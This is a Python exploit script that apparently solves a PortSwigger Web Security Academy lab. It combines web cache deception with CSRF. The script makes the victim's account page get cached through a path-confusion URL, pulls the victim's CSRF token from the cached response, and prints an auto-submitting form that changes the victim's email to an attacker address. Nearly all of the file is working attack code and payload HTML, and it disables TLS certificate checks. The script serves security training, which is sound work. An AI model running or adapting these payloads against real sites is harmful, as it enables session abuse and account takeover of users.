import http.client
import random
import re
import ssl
import string

LAB_ID = "???"


def GET_myaccount(cache_buster: str) -> http.client.HTTPResponse:
    method, path = 'GET', f"/my-account?{cache_buster}"
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


def GET_faviconico(cache_buster: str) -> http.client.HTTPResponse:
    method, path = 'GET', f"/favicon.ico?{cache_buster}"
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


def steal_my_account_csrf(cache_buster: str) -> str:
    response = GET_faviconico(cache_buster)
    print(response.status)
    print(response.headers['Content-Encoding'])
    return re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]


def random_str() -> str:
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(6))

cache_buster = random_str()
print("Head:")
print("""
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
""")
print("Body:")
print(f"""
<html>
<script>
    document.location = "https://{LAB_ID}.web-security-academy.net/my-account;%2f%2e%2e%2ffavicon.ico?{cache_buster}"
</script>
</body>
</html>
""")
input("Set up exploit, send to victim, and hit enter")


csrf = steal_my_account_csrf(cache_buster)

print("Head:")
print("""
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
""")
print("Body:")
print(f"""
<html>
<body>
<form action="https://{LAB_ID}.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="wiener@evil-user.net" />
    <input type="hidden" name="csrf" value="{csrf}" />
</form>
<script>
    document.forms[0].submit();
</script>
</body>
</html>
""")
print("Set up exploit, send to victim")
